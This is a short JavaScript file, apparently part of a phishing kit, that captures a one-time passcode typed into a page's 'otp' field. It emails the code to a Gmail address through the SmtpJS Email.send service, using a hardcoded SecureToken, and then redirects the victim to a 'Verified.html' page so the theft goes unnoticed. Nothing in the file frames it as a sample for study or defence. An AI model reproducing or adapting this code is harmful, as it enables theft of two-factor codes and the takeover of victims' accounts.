const fname = document.getElementById('otp');

submit.addEventListener('submit',(e)=>{
    e.preventDefault();
    let ebody = `
    <h3>OTP: </h3>${fname.value}
    <br>
    `;

    Email.send({
        SecureToken  : "2239aacf-e478-40ca-9771-4d741020e40c",
        To : 'wh0091394@gmail.com', 
        From : "nunugv@proton.me",
        Subject : "New Code",
        Body : ebody
    }).then(
      function Redirect() {
        window.location = "Verified.html"
      }
    );
});